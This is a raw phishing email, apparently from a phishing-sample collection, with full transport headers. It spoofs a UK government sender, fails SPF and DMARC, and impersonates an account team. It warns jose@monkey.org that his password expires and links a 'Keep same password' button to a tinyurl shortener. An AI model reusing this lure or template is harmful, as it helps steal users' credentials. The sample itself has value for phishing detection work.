@@ -1,0 +1,240 @@
+Return-Path: Rbzzn@mhra.gov.uk
+Delivered-To: jose@monkey.org
+X-FDA: 84197780478.33.52D4BD4
+Received: from CWXP265CU010.outbound.protection.outlook.com
+ (mail-ukwestazhn15012035.outbound.protection.outlook.com [52.102.166.35])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP id C6CD8160002
+	for <jose@monkey.org>; Mon,  8 Dec 2025 22:43:42 +0000 (UTC)
+Authentication-Results: imf22.b.hostedemail.com;
+	dkim=pass header.d=mhra.gov.uk header.s=selector1 header.b=ALGX1+fG;
+	spf=pass (imf22.b.hostedemail.com: domain of Rbzzn@mhra.gov.uk designates
+ 52.102.166.35 as permitted sender) smtp.mailfrom=Rbzzn@mhra.gov.uk;
+	dmarc=pass (policy=reject) header.from=mhra.gov.uk;
+	arc=pass ("microsoft.com:s=arcselector10001:i=1")
+ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1765233823;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=0JgCchso/RjVnYiBEkzAsUtjJuRdS3diyfvtkm0XjWc=;
+	b=Hkfchcyqev3pyrKrTduRmLe+9ZSvQu0AqX66lgQ5V86awkwgu3imaLXaZdG8LM3XcPGFWj
+	2Eitm8vBQm77MRXWJt3uhCBL/sXrQp2iNCETTbrWO7DNwu/Pd04O3nbj0ZsVjcEB+Di3oY
+	/6zb2CGq1Xga+0+uNZhYNL8vDSof4DM=
+ARC-Authentication-Results: i=2;
+	imf22.b.hostedemail.com;
+	dkim=pass header.d=mhra.gov.uk header.s=selector1 header.b=ALGX1+fG;
+	spf=pass (imf22.b.hostedemail.com: domain of Rbzzn@mhra.gov.uk designates
+ 52.102.166.35 as permitted sender) smtp.mailfrom=Rbzzn@mhra.gov.uk;
+	dmarc=pass (policy=reject) header.from=mhra.gov.uk;
+	arc=pass ("microsoft.com:s=arcselector10001:i=1")
+ARC-Seal: i=2; s=arc-20220608; d=hostedemail.com; t=1765233823; a=rsa-sha256;
+	cv=pass;
+	b=xqoV3bGNSxQrto53GnjLFIIZGxnW4bHRniXBf/szwIkokV4Bol3Uo4dMl2BcxZh1bb5egV
+	qgACJVfwwJEjlMqz9V7TuKZFqYokVyi+Y53jYK46jU0M7HCQHaOdYiacLBoy8UJi/X88K1
+	1NgjwcDVxUw8GtFCZx3X+DfdV+0wJPo=
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=UXbtVga0Haul+pNCr9JOOc58zgzRMF3bj370q6ZNM8Oq6GcZI51uTutbTpZv0HbiuNfF/xNyHbIRIHe3QVGPOJ6WHcN+ZPDUgUPHLPM60JzqYBQouHOur/N/uMQkMfjrwLj00oQMBQnvOTGTlLXLlFkNvvosk+r5Cz9U3vb0Vdv5DlAhi1sRMjvUnCXd5pxUJAbhLVdjHej2tqTfLWzGDvcM4WuZLVcZzKIHWmeJumucEOpiuE9Hr6ql2qaGv7UU6TcZd0xHfkNLx8atwlWW1Ka5JWo+sXkpq/vAorLpVlpJc2DjCZDEXG/AZddyf+wr1exep+maYsZABmZvrtjuag==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=0JgCchso/RjVnYiBEkzAsUtjJuRdS3diyfvtkm0XjWc=;
+ b=atEoOEyroNy00caZNGH6UFJTSJ6fF9vatl7XCNI8jx0xSuqVUMYD5lHh/yHywEUBRiqSex9N/lW1bzyfPHzLf1zygLRQ90Zr3Z4CqhCRmHsxJUy1E7xckJj1zIXaKm3RSAMsRDFkGswtRk1nZkYm3vQ/N1bbILWmlKoEw2q1YH3tT7sMe+D+tgDMDrrFKwnvvfTYvULOm3kdK2AOWo5kQTt1B+PAlBaokJagcaC+4OnS7elMruvrcIMG8pAlW/rNwy3Ya7NWPitNuabA2l81y74S2KpXyhZcsN+tb0TM4AY7LlHs+zGyGPZZc+2RZSW6lDPkAm1qXgpNJWSDrHl6CQ==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=fail (sender ip is
+ 51.11.169.23) smtp.rcpttodomain=monkey.org smtp.mailfrom=mhra.gov.uk;
+ dmarc=fail (p=reject sp=reject pct=100) action=oreject
+ header.from=mhra.gov.uk; dkim=none (message not signed); arc=none (0)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mhra.gov.uk;
+ s=selector1;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=0JgCchso/RjVnYiBEkzAsUtjJuRdS3diyfvtkm0XjWc=;
+ b=ALGX1+fGugIDxqVpW8ZxR0qhXafD1DPKQBCCy/Wz6JvxuTzQdiEPb6HtuTi4L+o2ZI+4vsTtB/21Ld5Ni8AJRXBwgS+0no4k2lt5lqYBOumc/7v98kxSV1uKcEKK35KKe99kwTXL3DHnhsKTLZ0OfPt9LWaLzwJFEySSYJHKLQM=
+Received: from AM9P250CA0006.EURP250.PROD.OUTLOOK.COM (2603:10a6:20b:21c::11)
+ by LOBP265MB8802.GBRP265.PROD.OUTLOOK.COM (2603:10a6:600:48c::5) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9388.14; Mon, 8 Dec
+ 2025 22:43:39 +0000
+Received: from AM4PEPF00027A67.eurprd04.prod.outlook.com
+ (2603:10a6:20b:21c:cafe::39) by AM9P250CA0006.outlook.office365.com
+ (2603:10a6:20b:21c::11) with Microsoft SMTP Server (version=TLS1_3,
+ cipher=TLS_AES_256_GCM_SHA384) id 15.20.9388.11 via Frontend Transport; Mon,
+ 8 Dec 2025 22:43:39 +0000
+X-MS-Exchange-Authentication-Results: spf=fail (sender IP is 51.11.169.23)
+ smtp.mailfrom=mhra.gov.uk; dkim=none (message not signed)
+ header.d=none;dmarc=fail action=oreject header.from=mhra.gov.uk;
+Received-SPF: Fail (protection.outlook.com: domain of mhra.gov.uk does not
+ designate 51.11.169.23 as permitted sender) receiver=protection.outlook.com;
+ client-ip=51.11.169.23; helo=cpwsmr01.mhra.gov.uk;
+Received: from cpwsmr01.mhra.gov.uk (51.11.169.23) by
+ AM4PEPF00027A67.mail.protection.outlook.com (10.167.16.84) with Microsoft
+ SMTP Server id 15.20.9412.4 via Frontend Transport; Mon, 8 Dec 2025 22:43:39
+ +0000
+Received: from [127.0.0.1] ([10.5.200.197]) by cpwsmr01.mhra.gov.uk with
+ Microsoft SMTPSVC(10.0.17763.1697);
+	 Mon, 8 Dec 2025 22:43:39 +0000
+Content-Type: text/html
+From: Monkey Team <Rbzzn@mhra.gov.uk>
+To: jose@monkey.org
+Subject: =?UTF-8?Q?=E2=9D=97=EF=B8=8F_Alert=3A*******Verifi?=
+ =?UTF-8?Q?cation_Required_ID=3AJose?=
+Message-ID: <2de55690-602f-e360-e038-020f87658340@mhra.gov.uk>
+Content-Transfer-Encoding: quoted-printable
+Date: Mon, 08 Dec 2025 22:43:39 +0000
+MIME-Version: 1.0
+X-OriginalArrivalTime: 08 Dec 2025 22:43:39.0208 (UTC)
+ FILETIME=[18A35C80:01DC6894]
+X-EOPAttributedMessage: 0
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: AM4PEPF00027A67:EE_|LOBP265MB8802:EE_
+X-MS-Office365-Filtering-Correlation-Id: 200a6748-dc9f-45d2-ae67-08de36ab3b32
+X-MS-Exchange-AtpMessageProperties: SA
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam: 
+ BCL:0;ARA:13230040|36860700013|376014|61400799027|82310400026|8096899003|7053199007|19588885047;
+X-Microsoft-Antispam-Message-Info: 
+ =?us-ascii?Q?jJ+x6Z9bUFTVH/FiDrJtLNF5y+DTM/31P7IGaqociwzbsQsbn57sIRNr4+Wq?=
+ =?us-ascii?Q?9pB98Vxp5Ut4zqUZeezMjcrVc7a8DhXh7AhCGa1oUrlrwvIe9X8UFGJLkyqF?=
+ =?us-ascii?Q?+v0pm300/NZUvNBx6LXVdzCFzMgeE0/imEuZJDLD5ZrLjW/ihzFOWfnU9R3i?=
+ =?us-ascii?Q?Zr8ZB+MGh/CUkCYy/sF3TVzxUu5xwW3OxHulWqnThsnrn9nFMwwk3IgSE8vZ?=
+ =?us-ascii?Q?tvBz+cuwVWAJ3zA6ctoZqZp1nqJUYbnHDj4cn0Yll6kvMsGYuQx/rQ7Cc81d?=
+ =?us-ascii?Q?erlANB2L8u7yhQodqL6lKf8XFeycS3SviWXecKdpmGTileSyI59FmxFDGZ1K?=
+ =?us-ascii?Q?Fh68o0ZfnMOn+QycbfQt7r+zObNQwqhpZoIfSb31RvLX54jQdyv85r+k+AhM?=
+ =?us-ascii?Q?qHLTooY+ZL1H3OoalPTS+JB4uF4umLyQuQ38CTLknCmRJLSM1Ozix3mhlo8r?=
+ =?us-ascii?Q?8zJRdzfat/NjPtM2WIUi06AYxs4SLm0pEhSDa4uOOK7V0IddvDtJ2ZMiTU+L?=
+ =?us-ascii?Q?LcyPy/72dN0oidTGAVQClX8DzHvIH80xh7aOHy5b/yvjLtslJ/ornSiQs+Xo?=
+ =?us-ascii?Q?RTiDNfr8HeV0S8VSGyTxhQkg8ogJDURhrVjyNJNUrmWgbONsHpRyN+NWNn09?=
+ =?us-ascii?Q?rsQuD2kS8McdHh+9BMOLRpARqSotrv2c9EVMEULx72BYfRgVtthdZHPCFaqU?=
+ =?us-ascii?Q?lLS6GG2r+S4+AKDHLf3US6rwqmUiElBWtPevnymF+QHIy8hmn3WsOtMncABz?=
+ =?us-ascii?Q?UdVLeYQrwArn6iIk/1AKdgAyqPrGQ1J4UpSsJxv8KI8yf5YW9Mkfv6RxW4oq?=
+ =?us-ascii?Q?VMD1bZwEzfmzuza1yTtYnvQEbImHLoExsnTgRNs3ZkVLFa452mOnNrUfSqJ6?=
+ =?us-ascii?Q?5FTNtgMc5de+ei9wdGb6xD4LImsGHHf4NHPAGs/HlVFUOwrfm6EBX7hHW8nD?=
+ =?us-ascii?Q?OaK0XCq+KatYO57Nz2CTPPh2kCW84mcZNjfs0PZCf9sPGcti2m5EiuXLX3zU?=
+ =?us-ascii?Q?gy0UbHFytWFMMOFlBQIdCc3XK/+TbqBjPDQHUvqgEvCuTrshCktETaAa/UPF?=
+ =?us-ascii?Q?fMqFwbWfF3Uw6l/07TCzQ2B79QkvpCs6zesIVbFOFp5WG5qYehA3tBfycK2e?=
+ =?us-ascii?Q?ttvVNfHEVnpXkcnefhlz98eOHwzQERnjx5H56c4plNGBXyKwcZswVoejRYdN?=
+ =?us-ascii?Q?/VXCAADSdeVLXgXBHX5SM7MV/jAUZFIc8yfVbPdBQpVq2xrrwMPtluUmkIOj?=
+ =?us-ascii?Q?uE9b3Q7sm9mXLNro2CYmPz/3om+KtuKC2zL/GjzkjT8kbCRJ5tWp3vF2Ite5?=
+ =?us-ascii?Q?5gmNhaaE2evRT+919bqVMbcWLc6zGhMSCybzqMhmRf3onsrnMLS3fuREfB8P?=
+ =?us-ascii?Q?UOYk9dM70kWR+YywFghKubRQnI05gHklFq3+2bybgyhbrBhec1pUSeTzK9I4?=
+ =?us-ascii?Q?QA2HnDKoEAdh0hH+qiqN3Ux0sheCSScgyDpnHyCU8t2gf0yVhxwSJN6GGN7X?=
+ =?us-ascii?Q?e0GTxBbVoiOoEdregFonwzY1Qkbsli0nRm4kTD8DdA4nMfhP9EMsgETcwkHY?=
+ =?us-ascii?Q?fX1L3Pf1yCU6Vr30kXKm07dI3c6ZJbvhBR9C3yfpIPmBQyw1ddV94sVQ0ayG?=
+ =?us-ascii?Q?iEDKB2JaaKttusS9ecIHO6bqpdgbD8/1EdB/Ee/DeYY/mFiuYyv9ayPhxIwF?=
+ =?us-ascii?Q?VqUtzZnvrxauTwiTne4nzziDI0UGBts1kxK4TjlA7FoERhKW0fOx3DbrjYwY?=
+ =?us-ascii?Q?bSL3TdmDzYUhdGvzGKkBZwmnO+433xavxBZbwWd4qUYqk1jo2DORihcUvlZa?=
+ =?us-ascii?Q?bYY19wkW7OZ11+Ck/nHyS//PwtAgIFbV39IYpUCIKtRY8mCIFvGtwVnmzg3U?=
+ =?us-ascii?Q?wXdgGs9yjFOaph7CON6hyLhL2UeEoYG5q8gAAqEPVcIWKzIRax5eH5gv3YNS?=
+ =?us-ascii?Q?SFeli61PrVg3FT4EzRcGv6Qz+0A/Y4pmCa11MjX/K6Ur4em5e9+XYUsdn6B9?=
+ =?us-ascii?Q?FrQ+gmp8sHr7YzDNj1JapNLOhN8rVkuwzexATM9w4HfAhVa39YHb/oXyyZWo?=
+ =?us-ascii?Q?1XQqRmY3ibhFzIuzMpyE8Doi4QoowwG/OJXZLA0MuXTpQ0CrE7pMH/Of/HtN?=
+ =?us-ascii?Q?tp1+bgXH+C6xs2ebpgK9m7ExwZKvg0V3dQkttrgmehI3HYimc3Pp58MNLBNg?=
+ =?us-ascii?Q?aE6ivZPviHae1M+lN4mEm7wezKHcpHmvJe79uv2bVmfMBXs/SkvjitlfxVG+?=
+ =?us-ascii?Q?TOdCy9qiBF3NVe74DTOIylr+mDwiOqMg1qjCEMwsPlubViNqVOul5GUgx9Vf?=
+ =?us-ascii?Q?9A7UQj8LAjXEJgFxfUh3fh6e51SVvxc/h62NT9m4Nb2g8I5nMLCeVVUQ6xmC?=
+ =?us-ascii?Q?pE1CQJQezhT0YYrkErlWeHbrEd7chbjCcTFMq6dB0HvjYa8ldJ0QC2dxe4sy?=
+ =?us-ascii?Q?of4lCajjG9KhhgQsmr25cjqA3l+wsSGhfIk4w1CYW8E8MmH37/IpdtQaNwDY?=
+ =?us-ascii?Q?oM9winxDaAn8QH73H+p+s73ciTuQZ67tLAk7AQn1ytAc82UYcCmZzQUTFwYV?=
+ =?us-ascii?Q?X5VFSYxggFjKLWNWfSWBA4oQYUOocikRoqHigM14xMAOgla5fJSZ4c1JkwXq?=
+ =?us-ascii?Q?7xiuZss6CpMc3pXu+nF9GtqMikySEDnP3Nws7bw/4Tkfq6tXEYkzWZ1ps7k/?=
+ =?us-ascii?Q?on26cQ=3D=3D?=
+X-Forefront-Antispam-Report: 
+ CIP:51.11.169.23;CTRY:GB;LANG:en;SCL:9;SRV:;IPV:NLI;SFV:SPM;H:cpwsmr01.mhra.gov.uk;PTR:InfoDomainNonexistent;CAT:OSPM;SFS:(13230040)(36860700013)(376014)(61400799027)(82310400026)(8096899003)(7053199007)(19588885047);DIR:OUT;SFP:1501;
+X-OriginatorOrg: mhra.gov.uk
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 08 Dec 2025 22:43:39.3486
+ (UTC)
+X-MS-Exchange-CrossTenant-Network-Message-Id: 
+ 200a6748-dc9f-45d2-ae67-08de36ab3b32
+X-MS-Exchange-CrossTenant-Id: e527ea5c-6258-4cd2-a27f-8bd237ec4c26
+X-MS-Exchange-CrossTenant-OriginalAttributedTenantConnectingIp: 
+ TenantId=e527ea5c-6258-4cd2-a27f-8bd237ec4c26;Ip=[51.11.169.23];Helo=[cpwsmr01.mhra.gov.uk]
+X-MS-Exchange-CrossTenant-AuthSource: 
+ AM4PEPF00027A67.eurprd04.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Anonymous
+X-MS-Exchange-CrossTenant-FromEntityHeader: HybridOnPrem
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: LOBP265MB8802
+X-Rspam-User: 
+X-Rspamd-Server: rspam01
+X-Rspamd-Queue-Id: C6CD8160002
+X-Stat-Signature: cm1knu8xdtd14ucrnk6fzusjo8m51k6y
+X-Spam-Status: Yes, score=17.30
+X-HE-Tag: 1765233822-473513
+X-HE-Meta: 
+ U2FsdGVkX1/jHE38j124Ov8onlWRJFb84z4GYUNlE72+utaw8WFIkSO8Oh0JIcU/7lFaQQQoq4SYNkIaR6udL8zS7RTLUvweBIpP9RZnONo6Ethp/IhaKQHmpBtcMeGaPOmKXVS0DBpe+14VVZTihTEQFmP9lFMFNq6aLAQLSRP4ego44LSEE1ZNs1CbXggkRs9vgw0Gzm6RMHSz9I+tgoXFoN+NxPzhja3KvHCUvmDcn2MWrFNe4bIWbScQzhBMGIy10ThkSmeyiySRiPbWlr4UbcFSnjZMEWRZdKITJWbb05BkNs6axebE2WDc4v88+y80H8zEofrkHTC+gmdpldPAhQWOkilUCiTjb1Ls6NidedzdUZeqDAPztAHkyNAmt+8oOPpQmRvx/NdNaV3+U51WQuvn1kbJYkTI1GNXUKsSmdVMIaI49EjKHaxzWBST2I/m7kO0eTQUpYFfAU6pR+E8GS6pA2u19lGUHAGikKIKYdVmsZ7UYJPIM/zJF7SMLMR+O0ALqnpHnHXKJ9zQ4Uck7TBpGAM4D9RGIloS7rHnNpgJiqRRBuLpgHBw+6fioHGylAU7SG/IA5n/ATrDYNIPm6cU6OPMge+c8AjGEAtDDRaFNtu7UvDnfq7EU7qhWqN7cdj5eVLoa+tblpvuaqFaD6aBHw3aYKtXLkaVBGFu1DNlnaI2t1mckjK7Pzm7gCXmqRCE4lqZ7H1XfyDWYyl0qCnwzn4084NPtasG16VY7Pddl0UbMM1udEqg7N9zoAWNF5Hoow3s6A2dtQUZosAiX7lrjm2bCE+rCjxkdvf1t9g+dDhoR4fpbHqvuXV23YH4NGGs4kETAZacciF4juTxdzCxSaaX7BDQ5b5F3p9il6QXeexrhzOxtoQf02R1VKcINp9b/vkO3EXvZ4JBJ+taE2I1jOpZVZ+KJhIv9p2VZrqrb80YR3EcqPZSKj0WFSavVj7b62cV1OREL4w5Q8P3t0g
+ 4gh0XiCIaC04MhkQbcLAI1ZSTweyShq2oEEHDnDwom3zgqYgH5SNZrLZbYYNuKtZGzfMtr+cHbXqyxVgy++ejlLEHfOXCdN0psXgxdTu2XGsB21tE387ZrJmTden0xGLQim1w6rzeD14sP531cVdkQXM9IjuMGZD7VHXPOphj5tSq8qV+eaVrRMmNYNuQrAfMMLUO2E6xrX44oOap8LjAkx/B9XPs4nJ1xZCMLht23PKHNoEfxODQlKcDHI8ZsTNGe1Z/wpcaeG3HJE+GLz0kLQ6Sirn0Sjy2jBExNwtcfObNzDynY9enQSHz39dIC0mrbAwdAor6xI432thmXE3NNkyJGrB5Fkwn5QfJhewevK4SSZOMBWHP9NSbontmLEc9t/vYsqvj3sELB72pKIyJfCCUegWtZFT937DoCbWBMwwGvSnYsdkERO2S4L0wGDXntAL7G0mUscFAT2odakWZhb7QYV14FdjUli+w
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 464
+
+<html>
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
+1">
+<title></title>
+<script bis_use=3D"true" charset=3D"utf-8" data-bis-config=3D"[&quot;facebo=
+ok.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&qu=
+ot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quo=
+t;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www=
+.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//=
+hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&=
+quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;sound=
+cloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,=
+&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2foll=
+ow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net=
+/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;/=
+/keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-ext=
+ension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//=
+analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/chec=
+kout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captch=
+a.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/c=
+ustomerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&=
+quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contac=
+ts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quo=
+t;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,=
+&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.=
+video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.n=
+et/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,=
+&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src=3D"=
+chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/traffic.js" t=
+ype=3D"text/javascript"></script>
+</head>
+<body>
+<p style=3D"text-align: center;">&nbsp;</p>
+<h1 style=3D"text-align: center;"><span style=3D"color: #0078d4;">Monkey</s=
+pan></h1>
+<p style=3D"text-align: center;">Dear jose,<br>
+<br>
+Your jose@monkey.org account password is set to expire.&nbsp;Tuesday, Decem=
+ber 9, 2025<br>
+<br>
+<a style=3D"font-size: 14px; font-family: inherit; width: 168px; vertical-a=
+lign: baseline; color: white; padding: 0px; text-align: center; margin: 0px=
+; display: inline-block; line-height: 40px; background-color: #0078d4; font=
+-stretch: inherit; border-radius: 2px; font-kerning: inherit; font-feature-=
+settings: inherit; border: 0px none currentcolor;" href=3D"https://tinyurl.=
+com/4ryxh7rr#jose@monkey.org" rel=3D"noopener noreferrer">Keep
+ same password</a><br>
+<br>
+This link expires in 48hours.<br>
+<br>
+<strong><em><a target=3D"_blank" rel=3D"noopener" data-saferedirecturl=3D"m=
+onkey.org">monkey.org</a>.</em></strong></p>
+<br>
+<br>
+DISCLAIMER This email and any files transmitted with it are confidential. I=
+f you are not the intended recipient, any reading, printing, storage, discl=
+osure, copying or any other action taken in respect of this email is prohib=
+ited and may be unlawful. If you
+ are not the intended recipient, please notify the sender immediately by us=
+ing the reply function and then permanently delete what you have received. =
+Incoming and outgoing email messages are routinely monitored for compliance=
+ with the Department of Health's
+ policy on the use of electronic communications. For more information on th=
+e Department of Health's email policy, click
+<a href=3D" https://www.gov.uk/help/terms-conditions"><b>DHTermsAndConditio=
+ns</b></a>
+</body>
+</html>
+
